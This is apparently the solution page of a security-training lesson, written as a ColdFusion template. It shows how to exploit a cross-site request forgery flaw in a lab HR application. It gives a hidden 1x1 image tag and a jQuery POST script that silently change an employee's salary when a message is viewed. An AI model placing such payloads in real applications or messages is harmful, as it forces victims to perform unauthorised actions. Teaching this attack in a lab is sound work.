<cf_layout>
	<cf_lessonToolbar />
	
	<div id="content">
		<h2>Solution</h2>
		
		<div id="solutionText">
			<p>Post a message to HR that contains an image tag like this: <code>&lt;img src="update-salary.cfm?employeeid=1&salary=9999999" height="1" width="1" /&gt;</code></p>
			<p>Or use javascript, here's an example using jQuery to perform a POST operation:</p>
<pre>
&lt;script&gt;
$(document).ready(function() {
	$.post('update-salary.cfm', {employeeid:1, salary:500000});
});
&lt;/script&gt;
</pre>
		</div>
	</div>
	
	
</cf_layout>